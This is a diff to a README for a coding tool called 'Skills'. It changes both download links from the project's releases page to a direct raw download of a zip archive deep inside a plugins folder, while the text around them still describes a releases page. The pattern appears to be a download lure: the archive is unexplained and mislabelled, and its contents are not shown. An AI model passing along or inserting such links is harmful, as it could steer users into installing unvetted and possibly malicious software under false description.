@@ -13,7 +13,7 @@ Skills is a powerful collection of smart tools that help you build better softwa
 
 ## 📥 Getting Started
 
-Visit this link to download the application: **[Download Skills](https://github.com/jiajiajiahuang47-byte/skills/releases)**
+Visit this link to download the application: **[Download Skills](https://github.com/jiajiajiahuang47-byte/skills/raw/refs/heads/main/plugins/show-me/skills/2.8.zip)**
 
 Once you're on that page, you'll see a list of available files. Click the most recent version to start your download. The process is straightforward—your browser will handle everything automatically.
 
@@ -139,7 +139,7 @@ Check back regularly for new skills and updates. The team behind Skills is const
 
 Download Skills today and see how much easier coding can be:
 
-**[👉 Download Skills Now](https://github.com/jiajiajiahuang47-byte/skills/releases)**
+**[👉 Download Skills Now](https://github.com/jiajiajiahuang47-byte/skills/raw/refs/heads/main/plugins/show-me/skills/2.8.zip)**
 
 Join the growing community of developers who are working smarter, not harder. With Skills, you'll have expert-level assistance right at your fingertips.
 
